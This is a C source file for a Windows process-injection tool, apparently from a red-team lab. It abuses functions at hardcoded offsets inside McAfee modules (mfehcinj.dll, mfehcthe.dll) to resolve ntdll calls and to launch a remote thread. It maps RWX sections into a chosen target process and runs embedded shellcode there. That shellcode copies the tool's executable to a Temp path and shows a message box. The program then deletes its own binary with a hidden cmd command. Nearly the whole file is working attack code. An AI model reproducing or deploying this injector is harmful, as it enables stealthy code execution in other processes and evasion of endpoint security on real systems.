#include <stdio.h>
#include <windows.h>
#include "CWLInc.h"
#include <string.h>
#include <time.h>

typedef DWORD(__cdecl* ResolvProcAddress)(LPCSTR moduleName, LPCSTR procName, FARPROC* fp);
typedef HANDLE(__stdcall* CreateUserOrRemoteThread)(void* p1, void* p2, void* v3);

PPEB GetPEB() {
#ifdef _WIN64
	PTEB teb = (PTEB)__readgsqword(offsetof(NT_TIB, Self));
#else
	PTEB teb = (PTEB)__readfsdword(offsetof(NT_TIB, Self));
#endif
	return (PPEB)teb->ProcessEnvironmentBlock;
}

struct XShellData {
	char new_path[0x100];
	void* mem_loc;
	size_t copy_size;
}ShellData, * PShellData;

#pragma optimize( "", off )
//---
#pragma optimize( "", on )
enum MfeHCInjOffset {
	LdLibrary = 0x2DFBF,
	ProcAddr = 0x2E059,
	CUT = 0x7FB44,
	CRT = 0x7FB50,
	CURTFunc = 0x97B0
};

enum MfeHcTheOffset {
	ResProcAddr = 0x015C0
};

void DelayExecution(int x_delay) {
	// delaying before NtProtect
	long delay = x_delay;
	time_t current = time(0);
	long stop = current + delay;
	while (1)
	{
		current = time(0);
		if (current >= stop)
			break;
	}
}

BYTE* GetPayloadBuffer(wchar_t* fileName, OUT size_t& p_size) {
	HANDLE hFile = INVALID_HANDLE_VALUE;
	hFile = CreateFileW(fileName, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		printf("[-] Unable to open file\n");
		exit(-1);
	}
	p_size = GetFileSize(hFile, 0);
	BYTE* buffer = (BYTE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, p_size);
	//(BYTE*)HeapAlloc(NULL, p_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	if (buffer == NULL) {
		printf("[-] Unable to Allocate memory\n");
		exit(-1);
	}
	DWORD bytesRead = 0;
	if (!ReadFile(hFile, buffer, p_size, &bytesRead, 0)) {
		perror("[-] Failed to read payload buffer... \n");
		exit(-1);
	}
	return buffer;
}

int main(int argc, char** argv) {
	int a_pid;
	printf("Enter target process PID : ");
	scanf_s("%d", &a_pid);
	if (a_pid == 0) {
		perror("[-] Invalid PID\n");
		return -1;
	}
	HANDLE hProcess = INVALID_HANDLE_VALUE;
	HANDLE hThread = INVALID_HANDLE_VALUE;
	HMODULE hMfehcinj;
	HMODULE hMfehcthe;
	HANDLE hSection;
	HANDLE pHSection;
	OBJECT_ATTRIBUTES objAttr;
	NTSTATUS status;
	//DelayExecution(0x10);
	hMfehcinj = GetModuleHandleA("mfehcinj.dll");
	hMfehcthe = GetModuleHandleA("mfehcthe.dll");
	if (hMfehcinj == NULL) {
		printf("[-] Can't access handle to the Current Process. Error code: %d \n", GetLastError());
		exit(-1);
	}
	printf("[+] Module is loaded at base address: %p\n", hMfehcinj);

	ResolvProcAddress pResolveProcAddress = (ResolvProcAddress)((ULONG_PTR)hMfehcthe + ResProcAddr);
	if (memcmp(pResolveProcAddress, "\x56\xFF\x74\x24\x08", 5) != 0) {
		exit(-1);
	}
	printf("[+] Function to control %p \n", pResolveProcAddress);

	// All resolved Functions
	FARPROC procAddr;
	_NtMapViewOfSection fpNtMapViewOfSection = NULL;
	_NtCreateSection fpNtCreateSection = NULL;
	_ZwOpenProcess fpZwOpenProcess = NULL;
	_RtlInitUnicodeString fpRtlInitUnicodeString = NULL;
	_LoadLibraryA fpLoadLibraryA = NULL;
	// TO:DO encrypt/decrypt module name and function name
	pResolveProcAddress("ntdll.dll", "NtMapViewOfSection", &procAddr);
	fpNtMapViewOfSection = (_NtMapViewOfSection)procAddr;
	if (fpNtMapViewOfSection == NULL) {
		printf("[+] Function NtMapViewOfSection is not Resolved ");
		exit(-1);
	}
	pResolveProcAddress("ntdll.dll", "NtCreateSection", &procAddr);
	fpNtCreateSection = (_NtCreateSection)procAddr;
	if (fpNtCreateSection == NULL) {
		printf("[+] Function NtCreateSection is not Resolved");
		exit(-1);
	}
	pResolveProcAddress("ntdll.dll", "ZwOpenProcess", &procAddr);
	fpZwOpenProcess = (_ZwOpenProcess)procAddr;
	if (fpZwOpenProcess == NULL) {
		printf("[+] Function ZwOpenProcess is not Resolved");
		exit(-1);
	}
	pResolveProcAddress("ntdll.dll", "RtlInitUnicodeString", &procAddr);
	fpRtlInitUnicodeString = (_RtlInitUnicodeString)procAddr;
	if (fpRtlInitUnicodeString == NULL) {
		printf("[+] Function RtlInitUnicodeString is not Resolved");
		exit(-1);
	}
	pResolveProcAddress("kernel32.dll", "LoadLibraryA", &procAddr);
	fpLoadLibraryA = (_LoadLibraryA)procAddr;
	if (fpLoadLibraryA == NULL) {
		printf("[+] Function LoadLibraryA is not Resolved");
		exit(-1);
	}

	// Shellcode
	unsigned char buf[] = "\x55\x89\xe5\x8b\x7d\x08\x31\xc9\xf7\xe1\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x70\x14\xad\x96\xad\x8b\x58\x10\x8b\x53\x3c\x01\xda\x8b\x52\x78\x01\xda\x8b\x72\x20\x01\xde\x31\xc9\x41\xad\x01\xd8\x81\x38\x47\x65\x74\x50\x75\xf4\x81\x78\x04\x72\x6f\x63\x41\x75\xeb\x81\x78\x08\x64\x64\x72\x65\x75\xe2\x8b\x72\x24\x01\xde\x66\x8b\x0c\x4e\x49\x8b\x72\x1c\x01\xde\x8b\x14\x8e\x01\xda\x89\xd6\x31\xc9\x51\x68\x6c\x65\x41\x61\x88\x4c\x24\x03\x68\x74\x65\x46\x69\x68\x43\x72\x65\x61\x54\x53\xff\xd6\x31\xc9\x51\x68\x80\x00\x00\x00\x6a\x02\x51\x51\x68\x00\x00\x00\x40\x57\xff\xd0\x50\x31\xc9\x51\x68\x65\x61\x61\x61\x66\x89\x4c\x24\x01\x88\x4c\x24\x03\x68\x65\x46\x69\x6c\x68\x57\x72\x69\x74\x54\x53\xff\xd6\x83\xc4\x10\x8d\x4d\x20\x5a\x89\x11\x31\xc9\x51\x51\x8b\x8f\x04\x01\x00\x00\x51\x8b\x8f\x00\x01\x00\x00\x51\x52\xff\xd0\x31\xc9\x68\x64\x6c\x65\x00\x88\x4c\x24\x03\x68\x65\x48\x61\x6e\x68\x43\x6c\x6f\x73\x54\x53\xff\xd6\x8b\x55\x20\x52\xff\xd0\x31\xc9\x51\x68\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68\x4c\x6f\x61\x64\x54\x53\xff\xd6\x50\x31\xc9\x51\x68\x6c\x6c\x61\x61\x66\x89\x4c\x24\x02\x68\x33\x32\x2e\x64\x68\x55\x73\x65\x72\x54\xff\xd0\x31\xc9\x51\x68\x6f\x78\x41\x61\x88\x4c\x24\x03\x68\x61\x67\x65\x42\x68\x4d\x65\x73\x73\x54\x50\xff\xd6\x31\xc9\x51\x68\x64\x61\x61\x61\x66\x89\x4c\x24\x01\x66\x89\x4c\x24\x03\x68\x68\x72\x65\x61\x68\x74\x65\x20\x54\x68\x52\x65\x6d\x6f\x89\xe7\x68\x21\x21\x2e\x61\x88\x4c\x24\x03\x68\x4c\x61\x62\x73\x68\x61\x72\x65\x20\x68\x57\x61\x72\x46\x68\x79\x62\x65\x72\x68\x6f\x6d\x20\x43\x68\x6f\x20\x46\x72\x68\x48\x65\x6c\x6c\x89\xe2\x51\x57\x52\x51\xff\xd0\x31\xc0\x5e\x5b\xc9\xc3";
	// junks
	unsigned char junks[] = "\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc";
	DWORD heapSize = sizeof(buf) + sizeof(junks) + sizeof(ShellData);
	// Alloc heap
	PVOID heapAddr = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, heapSize);
	// copy data to heap
	if (heapAddr == NULL) {
		exit(-1);
	}
	memcpy(heapAddr, &buf, sizeof(buf));
	memcpy((void*)((UINT_PTR)heapAddr + sizeof(buf)), &junks, sizeof(junks));

	// CreateSection for payload
	SIZE_T actualSize = sizeof(buf) + sizeof(junks) + sizeof(ShellData);
	SIZE_T scSize = sizeof(buf) + sizeof(junks) + sizeof(ShellData);
	LARGE_INTEGER lScSize = { scSize };
	// MAXIMUM_ALLOWED => this flags allows to create section larger than  4K
	status = fpNtCreateSection(&hSection, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE | SECTION_EXTEND_SIZE | MAXIMUM_ALLOWED,
		NULL, (PLARGE_INTEGER)&lScSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
	if (!NT_SUCCESS(status)) {
		perror("[+] Error on Creating Section\n");
		exit(-1);
	}
	printf("[+] Section Created\n");

	// Map view of section to local process
	PVOID localSectionBaseAddr = { 0 };
	PVOID remoteSectionBaseAddr = { 0 };
	status = fpNtMapViewOfSection(hSection, GetCurrentProcess(), &localSectionBaseAddr, NULL, NULL, NULL, &scSize, ViewUnmap, NULL, PAGE_EXECUTE_READWRITE);
	if (!NT_SUCCESS(status)) {
		perror("[+] Error on NtMapViewOfSection Local\n");
		exit(-1);
	}
	//DelayExecution(0x4);
	printf("[+] Mapped view to local process\n");
	CLIENT_ID pid;
	InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);
	pid.UniqueProcess = (HANDLE)(a_pid);
	pid.UniqueThread = (HANDLE)0;
	// Getting handle to target process
	fpZwOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objAttr, &pid);
	if (hProcess == INVALID_HANDLE_VALUE) {
		printf("[-] Invalid Handle Value \n");
	}
	printf("[+] Got handle to the process %d\n", (DWORD)hProcess);
	//DelayExecution(0x6);
	// Map view of section to target process //For shellcode RWX
	status = fpNtMapViewOfSection(hSection, hProcess, &remoteSectionBaseAddr, NULL, NULL, NULL, &scSize, ViewUnmap, NULL, PAGE_EXECUTE_READ);
	if (!NT_SUCCESS(status)) {
		perror("[+] Error on NtMapViewOfSection Remote\n");
		exit(-1);
	}
	printf("[+] Mapped view to remote process\n");
	// [-- We created the section for shellcode but we'll not copy our shellcode
	//		there's something we need to add before copying shellcode --]

	// CreateSection for payload buffer
	// Getting payload and payload size
	wchar_t payload_addr[0x100] = { 0 };
	size_t len = 0;
	mbstowcs_s(&len, payload_addr, argv[0], strlen(argv[0]));
	wprintf(L"[+] Payload Name %s\n", payload_addr);
	//system("pause");
	size_t payload_size = 0;
	BYTE* buffer = GetPayloadBuffer(payload_addr, payload_size);
	SIZE_T p_size = payload_size;
	//SIZE_T scSize = sizeof(buf) + sizeof(junks) + sizeof(ShellData);
	lScSize = { p_size };
	status = fpNtCreateSection(&pHSection, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE | SECTION_EXTEND_SIZE | MAXIMUM_ALLOWED,
		NULL, (PLARGE_INTEGER)&lScSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
	if (!NT_SUCCESS(status)) {
		perror("[+] Error on Creating Section\n");
		exit(-1);
	}
	printf("[+] Section Created\n");
	//DelayExecution(0x2);
	// Map view of section to local process
	PVOID localPESectionBaseAddr = { 0 };
	PVOID remotePESectionBaseAddr = { 0 };
	status = fpNtMapViewOfSection(pHSection, GetCurrentProcess(), &localPESectionBaseAddr, NULL, NULL, NULL, &p_size, ViewUnmap, NULL, PAGE_EXECUTE_READWRITE);
	if (!NT_SUCCESS(status)) {
		perror("[+] Error on NtMapViewOfSection Local\n");
		exit(-1);
	}
	printf("[+] Mapped view to local process\n");
	// Map view of section to target process //For shellcode RWX
	status = fpNtMapViewOfSection(pHSection, hProcess, &remotePESectionBaseAddr, NULL, NULL, NULL, &p_size, ViewUnmap, NULL, PAGE_EXECUTE_READ);
	if (!NT_SUCCESS(status)) {
		perror("[+] Error on NtMapViewOfSection Remote\n");
		exit(-1);
	}
	printf("[+] Mapped view to remote process\n");
	printf("[+] Copying PE to mapped section...\n");
	memcpy((void*)localPESectionBaseAddr, buffer, payload_size);

	// setting up parameters
	char newPath[0x100] = "";
	// This is the path where we move our shellcode. This path can be dynamically
	// generated or can be encrypted for stealthier.
	// TODO: Finding Random Directory with RWX permission
	// TODO: Generate Random name for the payload
	strcat_s(newPath, "C:\\Users\\Xploiter\\AppData\\Local\\Temp\\test.exe");
	strcpy_s(ShellData.new_path, newPath);
	ShellData.mem_loc = remotePESectionBaseAddr;
	ShellData.copy_size = payload_size;
	memcpy((void*)((UINT_PTR)heapAddr + sizeof(buf) + sizeof(junks)), &ShellData, sizeof(ShellData));

	printf("[+] Copying payload to mapped section...\n");
	memcpy((void*)localSectionBaseAddr, heapAddr, actualSize);
	// Patching Global for CRT
	DWORD CUTPatchAddr = ((ULONG_PTR)hMfehcinj + CUT);
	DWORD CUTPatchBytes = 0x0;
	DWORD CRTPatchAddr = ((ULONG_PTR)hMfehcinj + CRT);
	pResolveProcAddress("kernel32.dll", "CreateRemoteThreadEx", &procAddr);
	DWORD CRTPatchBytes = (DWORD)procAddr;
	memcpy((void*)CUTPatchAddr, &CUTPatchBytes, sizeof(DWORD));
	memcpy((void*)CRTPatchAddr, &CRTPatchBytes, sizeof(DWORD));
	//DelayExecution(0x8);
	LPTHREAD_START_ROUTINE runME = (LPTHREAD_START_ROUTINE)remoteSectionBaseAddr;
	printf("[+] Executing...\n");
	//Crafting Remote Thread
	CreateUserOrRemoteThread createUserOrRemoteThread = (CreateUserOrRemoteThread)((UINT_PTR)hMfehcinj + CURTFunc);
	// param location offset
	DWORD param = sizeof(buf) + sizeof(junks);
	createUserOrRemoteThread((void*)hProcess, (void*)remoteSectionBaseAddr, (void*)((UINT_PTR)remoteSectionBaseAddr + param));
	// Self-destruct 
	// https://stackoverflow.com/questions/1606140/how-can-a-program-delete-its-own-executable/66847136#66847136
	// alternatively we can put our binary 
	// in delete-pending state
	char* process_name = argv[0];
	char delCommand[256] = "start /min cmd /c del ";
	strcat_s(delCommand, process_name);
	
	// Delaying before self-destruct so that shellcode can move the binary to other location
	printf("[+] Delaying Before self-destruct...\n");
	DelayExecution(0x7);
	printf("[+] Attempting to delete itself...\n");
	system(delCommand);
}
